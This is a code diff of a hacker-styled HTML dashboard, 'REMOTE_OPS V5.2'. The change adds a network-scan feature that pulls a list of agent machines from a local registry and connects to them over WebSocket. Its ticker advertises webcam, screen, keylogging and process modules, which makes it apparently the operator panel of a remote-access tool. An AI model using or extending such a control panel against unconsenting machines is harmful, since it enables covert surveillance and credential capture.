@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>REMOTE_OPS // V5.1_FIXED</title>
+    <title>REMOTE_OPS // V5.2_NETSCAN</title>
     <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;600&family=Share+Tech+Mono&display=swap" rel="stylesheet">
     
     <style>
@@ -23,9 +23,8 @@
             background-color: var(--bg-color);
             color: var(--main-color);
             margin: 0; padding: 0;
-            height: 100vh;
-            width: 100vw;
-            overflow: hidden; /* CHẶN TUYỆT ĐỐI SCROLL BODY */
+            height: 100vh; width: 100vw;
+            overflow: hidden;
             display: flex; flex-direction: column;
         }
 
@@ -35,43 +34,56 @@
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background: linear-gradient(to bottom, rgba(255,255,255,0), rgba(255,255,255,0) 50%, rgba(0,0,0,0.2) 50%, rgba(0,0,0,0.2));
             background-size: 100% 4px;
-            z-index: 9999; 
-            pointer-events: none; 
+            z-index: 9999; pointer-events: none; 
         }
 
         /* --- 3. UI COMPONENTS --- */
         
-        /* HEADER (Fixed Height: 50px) */
+        /* HEADER */
         .header {
             height: 50px; display: flex; align-items: center; padding: 0 20px;
             border-bottom: 2px solid var(--main-color);
             background: rgba(0, 20, 0, 0.95);
             justify-content: space-between;
-            position: relative; z-index: 10;
-            flex-shrink: 0; /* Không cho phép co lại */
+            position: relative; z-index: 100; flex-shrink: 0;
         }
 
-        /* GRID LAYOUT (Quan trọng: Tính toán chiều cao còn lại) */
+        /* NETWORK SELECTOR (NEW) */
+        .net-selector {
+            position: relative;
+            display: flex; gap: 5px;
+        }
+        #target-select {
+            background: #000; color: var(--main-color);
+            border: 1px solid var(--dim-color);
+            padding: 5px; font-family: 'Share Tech Mono';
+            width: 200px; outline: none;
+            display: none; /* Ẩn mặc định, hiện khi có list */
+        }
+        #ip {
+            background: #000; border: 1px solid var(--dim-color); 
+            color: var(--accent-color); padding: 8px; 
+            font-family: 'Share Tech Mono'; font-size: 13px;
+            width: 180px; text-align: center; outline: none;
+        }
+
+        /* GRID LAYOUT */
         .main-grid {
             display: grid;
             grid-template-columns: 280px 1fr 320px; 
-            /* Trừ đi Header(50px) + Padding(30px) + Ticker(25px) */
             height: calc(100vh - 50px - 25px); 
             gap: 15px; padding: 15px;
             position: relative; z-index: 10;
-            overflow: hidden; /* Nội dung tràn sẽ bị cắt hoặc cuộn bên trong */
+            overflow: hidden; 
         }
 
-        /* PANELS - Sửa lỗi Flexbox */
+        /* PANELS */
         .panel {
             background: var(--glass-bg);
             border: 1px solid var(--dim-color);
             padding: 10px; display: flex; flex-direction: column;
-            position: relative;
-            transition: all 0.3s;
-            height: 100%; /* Chiếm hết chiều cao ô grid */
-            overflow: hidden; /* Quan trọng: Giữ nội dung bên trong */
-            min-height: 0; /* Fix lỗi Flexbox trên Firefox/Chrome */
+            position: relative; transition: all 0.3s;
+            height: 100%; overflow: hidden; min-height: 0;
         }
         .panel:hover { border-color: var(--main-color); box-shadow: 0 0 15px rgba(0, 255, 65, 0.1); }
         
@@ -89,15 +101,7 @@
         }
         h3::before { content: ">> "; color: var(--main-color); }
 
-        /* --- 4. BUTTONS & INPUTS --- */
-        input {
-            background: #000; border: 1px solid var(--dim-color); 
-            color: var(--main-color); padding: 8px; 
-            font-family: 'Share Tech Mono'; font-size: 13px;
-            outline: none; transition: 0.3s;
-        }
-        input:focus { border-color: var(--main-color); box-shadow: 0 0 10px var(--dim-color); }
-
+        /* BUTTONS */
         button {
             background: rgba(0, 50, 0, 0.3); border: 1px solid var(--main-color);
             color: var(--main-color); padding: 6px 12px;
@@ -109,43 +113,29 @@
         button:active { transform: scale(0.95); } 
         .btn-red { border-color: var(--alert-color); color: var(--alert-color); background: rgba(50, 0, 0, 0.3); }
         .btn-red:hover { background: var(--alert-color); color: #fff; box-shadow: 0 0 15px var(--alert-color); }
+        .btn-scan { border-color: var(--accent-color); color: var(--accent-color); }
+        .btn-scan:hover { background: var(--accent-color); color: #000; box-shadow: 0 0 15px var(--accent-color); }
+        
         .btn-group { display: flex; gap: 5px; margin-bottom: 5px; flex-shrink: 0; }
 
-        /* --- 5. CONTENT ELEMENTS (SCROLL FIX) --- */
-        
-        /* Cột giữa: Chứa ảnh */
+        /* CONTENT ELEMENTS */
         .col-center { display: flex; flex-direction: column; gap: 15px; height: 100%; overflow: hidden; }
-
-        /* Khung chứa ảnh (Fix tràn) */
         .screen-container {
-            flex-grow: 1; /* Tự động giãn */
-            border: 1px solid var(--dim-color); background: #000;
+            flex-grow: 1; border: 1px solid var(--dim-color); background: #000;
             display: flex; align-items: center; justify-content: center;
             background-image: repeating-linear-gradient(0deg, transparent, transparent 1px, #001100 1px, #001100 2px);
-            position: relative; overflow: hidden; 
-            min-height: 0; /* Cho phép co lại nếu cần */
+            position: relative; overflow: hidden; min-height: 0;
         }
-        img.view-area { 
-            max-width: 100%; max-height: 100%; /* Giới hạn ảnh trong khung */
-            object-fit: contain; /* Giữ tỷ lệ ảnh */
-            display: block; 
-        }
+        img.view-area { max-width: 100%; max-height: 100%; object-fit: contain; display: block; }
         .rec-dot { position: absolute; top: 10px; right: 10px; color: red; font-size: 10px; animation: blink 1s infinite; display: none; }
 
-        /* Bảng dữ liệu (Fix tràn) */
-        .table-wrap { 
-            flex-grow: 1; /* Chiếm phần còn lại */
-            overflow-y: auto; /* Chỉ cuộn phần này */
-            border: 1px solid var(--dim-color); margin-bottom: 10px; 
-            min-height: 0; /* Quan trọng để scroll hoạt động */
-        }
-        
+        .table-wrap { flex-grow: 1; overflow-y: auto; border: 1px solid var(--dim-color); margin-bottom: 10px; min-height: 0; }
         table { width: 100%; border-collapse: collapse; font-size: 12px; }
         th { position: sticky; top: 0; background: #002200; color: var(--accent-color); text-align: left; padding: 5px; z-index: 5; }
         td { padding: 4px 5px; border-bottom: 1px solid #001100; color: #888; }
         tr:hover td { background: var(--main-color); color: #000; cursor: pointer; }
 
-        /* Ticker Footer */
+        /* TICKER */
         .ticker-wrap {
             position: fixed; bottom: 0; width: 100%; height: 25px;
             background: #000; border-top: 1px solid var(--dim-color);
@@ -156,17 +146,31 @@
         .ticker strong { color: var(--main-color); }
         @keyframes marquee { 0% { transform: translate(100%, 0); } 100% { transform: translate(-100%, 0); } }
 
-        /* Log & Components */
+        /* MISC */
         textarea { width: 100%; height: 100%; background: #000; border: none; color: var(--main-color); padding: 8px; resize: none; font-family: 'Fira Code'; font-size: 11px; outline: none; }
         #skull-art { font-family: 'Fira Code', monospace; font-size: 8px; line-height: 8px; color: var(--dim-color); text-align: center; margin: 10px 0; transition: color 0.5s; flex-shrink: 0; }
         .chart-container { width: 100%; height: 60px; border: 1px solid var(--dim-color); background: #000; margin-bottom: 10px; flex-shrink: 0; }
         canvas.chart { width: 100%; height: 100%; display: block; }
-
         @keyframes blink { 50% { opacity: 0; } }
-        /* Scrollbar */
         ::-webkit-scrollbar { width: 6px; }
         ::-webkit-scrollbar-thumb { background: var(--dim-color); }
         ::-webkit-scrollbar-thumb:hover { background: var(--main-color); }
+
+        /* SCAN OVERLAY */
+        #scan-overlay {
+            position: absolute; top: 55px; left: 20px; 
+            width: 300px; background: rgba(0, 20, 0, 0.95);
+            border: 1px solid var(--accent-color);
+            z-index: 200; display: none;
+            padding: 10px;
+            box-shadow: 0 0 20px rgba(0, 247, 255, 0.2);
+        }
+        .scan-item {
+            padding: 5px; border-bottom: 1px solid #003300;
+            cursor: pointer; display: flex; justify-content: space-between;
+        }
+        .scan-item:hover { background: var(--accent-color); color: #000; }
+        .scan-anim { animation: blink 0.5s infinite; color: var(--accent-color); }
 
     </style>
 </head>
@@ -177,17 +181,32 @@
 
     <div class="header">
         <div style="font-size: 22px; font-weight: bold; letter-spacing: 2px;">
-            REMOTE<span style="color:var(--accent-color)">OPS</span> <span style="font-size:12px; color:#555">// V5.1_STABLE</span>
+            REMOTE<span style="color:var(--accent-color)">OPS</span> <span style="font-size:12px; color:#555">// V5.2_NET</span>
         </div>
-        <div style="display: flex; gap: 10px; align-items: center;">
-            <input type="text" id="ip" value="ws://localhost:9010" style="width: 220px; text-align: center;">
+        
+        <div class="net-selector">
+            <button class="btn-scan" onclick="scanNetwork()">📡 SCAN NET</button>
+            
+            <select id="target-select" onchange="document.getElementById('ip').value = this.value">
+                <option value="">-- SELECT TARGET --</option>
+            </select>
+
+            <input type="text" id="ip" value="ws://localhost:9010" placeholder="Target IP...">
             <button onclick="connect()">INITIALIZE_LINK</button>
             <div id="status" style="width: 100px; text-align: center; border: 1px solid #333; padding: 5px; font-size: 12px; color: #555;">OFFLINE</div>
         </div>
     </div>
 
-    <div class="main-grid">
+    <div id="scan-overlay">
+        <div style="border-bottom: 1px solid var(--accent-color); margin-bottom: 5px; padding-bottom: 5px;">
+            > NETWORK_DISCOVERY <span class="scan-anim" id="scan-icon">●</span>
+        </div>
+        <div id="scan-list">
+            <div style="color: #666; font-style: italic;">Scanning subnet...</div>
+        </div>
+    </div>
 
+    <div class="main-grid">
         <div class="panel">
             <div class="corner tl"></div><div class="corner tr"></div><div class="corner bl"></div><div class="corner br"></div>
             <h3>SYSTEM_STATUS</h3>
@@ -291,11 +310,10 @@ C  $  .ec.        .ec.    $$$$
     <div class="ticker-wrap">
         <div class="ticker">
             <span>[SYSTEM]: <strong>READY</strong></span>
-            <span>[ENCRYPTION]: <strong>AES-256</strong></span>
+            <span>[NET_MODE]: <strong>SCANNER_ACTIVE</strong></span>
             <span>[PORT]: <strong>9010</strong></span>
             <span>[STATUS]: <strong>WAITING FOR TARGET...</strong></span>
             <span>[MODULES]: <strong>WEBCAM, SCREEN, KEYLOG, PROCESS LOADED</strong></span>
-            <span>[WARNING]: <strong>UNAUTHORIZED ACCESS DETECTED</strong></span>
         </div>
     </div>
 
@@ -334,14 +352,66 @@ C  $  .ec.        .ec.    $$$$
         chartCtx.stroke();
     }, 80);
 
-    // --- 3. LOGIC KẾT NỐI ---
+    // --- 3. LOGIC KẾT NỐI & SCAN ---
     let ws = null;
     let isWaitingForScreenshot = false;
+    const REGISTRY_API = "http://localhost:3000/api/agents"; // Cổng Server quản lý
+
+    // >>> HÀM MỚI: QUÉT MẠNG <<<
+    async function scanNetwork() {
+        const overlay = document.getElementById('scan-overlay');
+        const list = document.getElementById('scan-list');
+        const select = document.getElementById('target-select');
+        
+        overlay.style.display = 'block';
+        list.innerHTML = '<div style="color:var(--accent-color)">> PINGING REGISTRY (PORT 3000)...</div>';
+
+        try {
+            // Gọi Registry Server để lấy danh sách agent
+            const res = await fetch(REGISTRY_API);
+            const agents = await res.json();
+            
+            list.innerHTML = '';
+            select.innerHTML = '<option value="">-- FOUND TARGETS --</option>';
+            select.style.display = 'block';
+
+            if(agents.length === 0) {
+                list.innerHTML = '<div style="color:red">> NO ACTIVE AGENTS FOUND.</div>';
+            }
+
+            agents.forEach(agent => {
+                // Tạo item trong list overlay
+                const item = document.createElement('div');
+                item.className = 'scan-item';
+                item.innerHTML = `<span>${agent.machineId}</span> <span>${agent.ip}</span>`;
+                item.onclick = () => {
+                    document.getElementById('ip').value = `ws://${agent.ip}:${agent.wsPort || 9010}`;
+                    overlay.style.display = 'none';
+                };
+                list.appendChild(item);
+
+                // Tạo option trong dropdown
+                const opt = document.createElement('option');
+                opt.value = `ws://${agent.ip}:${agent.wsPort || 9010}`;
+                opt.text = `${agent.machineId} (${agent.ip})`;
+                select.appendChild(opt);
+            });
+
+            updateTicker(`SCAN COMPLETE. FOUND ${agents.length} NODES.`);
+
+        } catch (e) {
+            list.innerHTML = '<div style="color:red">> REGISTRY OFFLINE.</div><div style="color:#555; font-size:10px;">Ensure Node.js Server is running on port 3000</div>';
+            updateTicker("SCAN FAILED. REGISTRY UNREACHABLE.");
+            
+            // Tự động đóng sau 3 giây nếu lỗi
+            setTimeout(() => { overlay.style.display = 'none'; }, 3000);
+        }
+    }
 
     function connect() {
         if(ws) { ws.close(); ws=null; }
         const ip = document.getElementById('ip').value;
-        const btn = document.querySelector('.header button');
+        const btn = document.querySelector('.header button:last-of-type'); // Select nút connect
         const status = document.getElementById('status');
 
         btn.innerText = "CONNECTING...";
@@ -353,13 +423,13 @@ C  $  .ec.        .ec.    $$$$
                 status.innerText = "ONLINE"; status.style.color = "#0f0"; status.style.borderColor = "#0f0";
                 btn.innerText = "DISCONNECT";
                 document.getElementById('skull-art').style.color = "#0f0";
-                updateTicker("TARGET LOCKED. CONNECTION ESTABLISHED.");
+                updateTicker(`TARGET LOCKED: ${ip}`);
             };
             ws.onclose = () => {
                 status.innerText = "OFFLINE"; status.style.color = "#555"; status.style.borderColor = "#555";
                 btn.innerText = "INITIALIZE LINK";
                 document.getElementById('skull-art').style.color = "#555";
-                updateTicker("CONNECTION LOST. SEARCHING...");
+                updateTicker("CONNECTION LOST.");
             };
             ws.onmessage = (evt) => {
                 if(evt.data instanceof ArrayBuffer) {
